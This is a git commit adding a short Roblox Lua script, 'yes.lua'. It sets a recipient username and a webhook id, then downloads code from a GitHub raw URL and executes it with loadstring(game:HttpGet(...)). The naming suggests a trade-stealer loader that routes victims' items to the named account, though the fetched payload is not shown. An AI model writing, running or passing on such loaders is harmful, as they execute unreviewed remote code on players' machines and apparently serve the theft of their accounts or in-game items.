b0cdf3ca6848b7eefbb9c1cecfc50daf420e3aaa
hue55109-cell <hue55109@gmail.com>
2026-03-08 00:11:13 -0600

    Create yes.lua

---
+++ yes.lua
@@ -0,0 +1,8 @@
+getgenv().Username = {
+    "moneymoneypuggyihave"
+}
+getgenv().Webhook = "wh_02c70ac5a162655d7c"
+getgenv().Visual = "https://raw.githubusercontent.com/real-script/MyOwnLoadingScript/refs/heads/main/Script.lua"
+getgenv().BrainrotPing = "1/s"
+-- Load and run remote script
+local loader, result1, result2 = loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/SABTrde"), nil)()
